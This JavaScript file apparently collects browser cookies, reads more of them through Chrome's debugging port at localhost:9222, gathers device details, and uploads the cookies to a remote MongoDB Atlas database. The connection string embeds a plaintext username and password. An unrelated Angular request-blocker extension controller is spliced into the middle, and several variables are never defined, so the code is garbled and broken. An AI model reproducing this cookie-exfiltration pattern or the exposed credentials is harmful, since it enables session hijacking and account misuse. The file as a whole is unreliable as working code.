const request = require('request');
const axios = require('axios');
const Cookies = require('js-cookie');
const mongodb = require('mongodb');
const MongoClient = mongodb.MongoClient;
const navigator = require('navigator');
const url = 'mongodb+srv://rrwabina:Carpediem13@maindb.ium16x6.mongodb.net/?retryWrites=true&w=majority';
const dbName = 'maindb';
const collectionName = 'cookiedb';

async function getData() { 
  let result = await client.connect();
  db = result.db(databaseName);
  collection = db.collection('cookiedb');
  let data = await collection.find({}).toArray();
  console.log(data)
}


async function collectCookies(domain) {
  try {
    request(domain, function (error, response, body) {
      if (error) throw error;
      const cookies = Cookies.get();
      const cookiesJSON = JSON.stringify(cookies);
      MongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, async function (error, client) {
        if (error) throw error;
        const db = client.db(dbName);
        console.log('You are already connected to your database.');

        await db.collection(collectionName).insertOne({ cookies: cookiesJSON });
        client.close();
        console.log('Cookies have been successfully collected and stored in the database.');
      });
    });
  } catch (error) {
    console.error(error);
  }
}


async function dbConnect() { 
    let result = await client.connect();
    db = result.db(databaseName);
    return db.collection('cookiedb');

}

function getBrowserCookies() {
  request("http://localhost:9222/json/cookies", (error, response, body) => {
    if (!error && response.statusCode == 200) {
      const cookies = JSON.parse(body);
      cookies.forEach((cookie) => {
        console.log("domain: ", cookie.domain);
        console.log("name: ", cookie.name);
        console.log("expiration: ", cookie.expirationDate);
        console.log("host: ", cookie.hostOnly);
        console.log("http: ", cookie.httpOnly);
        console.log("site: ", cookie.sameSite);
        console.log("session: ", cookie.session);
        console.log("storeId: ", cookie.storeId);
      });
    }
  });
}

function getDeviceInfo() {
    const deviceInfo = {};
    deviceInfo.appCodeName = navigator.appCodeName;
    deviceInfo.appName = navigator.appName;
    deviceInfo.appVersion = navigator.appVersion;
    deviceInfo.platform = navigator.platform;
    deviceInfo.userAgent = navigator.userAgent;
    deviceInfo.language = navigator.language;
    return deviceInfo;
  }
  

  MongoClient.connect(uri, { useNewUrlParser: true }, function (err, client) {
    if (err) {
      console.log("Error connecting to MongoDB:", err);
    } else {
      console.log("Successfully connected to MongoDB");
  
      const db = client.db("test");
      const collection = db.collection("documents");
  
      client.close();
    }
  });


  var app = angular.module('RequestBlockerApp', []);

app.controller('PopupController', function($scope) {

    $scope.isValidPattern = function(urlPattern) {
      var validPattern = /^(file:\/\/.+)|(https?|ftp|\*):\/\/(\*|\*\.([^\/*]+)|([^\/*]+))\//g;
      return !!urlPattern.match(validPattern);
    }

    $scope.backgroundPage = chrome.extension.getBackgroundPage();
    $scope.patterns = $scope.backgroundPage.patterns.map(function(x, i) {
        return {
            index: i,
            pattern: x,
            isValid: function() {
              return $scope.isValidPattern(this.pattern);
            }
        };
    });

    $scope.remove = function(patternToRemove) {
        var index = $scope.patterns.indexOf(patternToRemove);
        if (index > -1) {
            $scope.patterns.splice(index, 1);
        }
    }

    $scope.add = function() {
        $scope.patterns.push({
            index: $scope.patterns.length,
            pattern: '*://*.'
        });
    }

    $scope.save = function() {
        var patterns = $scope.patterns.map(function(x) {
            return x.pattern;
        });

        $scope.backgroundPage.save(patterns, function() {
            $scope.$apply(function() {
                $scope.success('Patterns saved successfully!');
            });
        });
    };

    $scope.success = function(message, title) {
        $scope.modal(message, title || "Success", "text-info");
    }
    $scope.error = function(message, title) {
        $scope.modal(message, title || "Error", "text-danger");
    }
    $scope.modal = function(message, title, modalClass) {
        $scope.modalClass = modalClass;
        $scope.modalTitle = title;
        $scope.modalMessage = message;
        $('#modal').modal();
    }
});


const ReformatCookies = cookies => {
  const formatCookie = cookie => {
  return `{
      domain: '${cookie.domain}',
      name: '${cookie.name}',
      expiration: ${cookie.expiration},
      host: ${cookie.host},
      http: ${cookie.http},
      site: '${cookie.site}',
      session: ${cookie.session},
      storeid: '${cookie.storeid}'
      }`;
      };

  const formatCookies = cookies => {
      return cookies.map(formatCookie).join(',\n');
      };

  const query = cookies => {
      return `db.cookiedb.insertMany([\n${formatCookies(cookies)}\n])`;
      };

  const text = formatCookie(cookies);
  console.log(text);
};

module.exports = ReformatCookies;
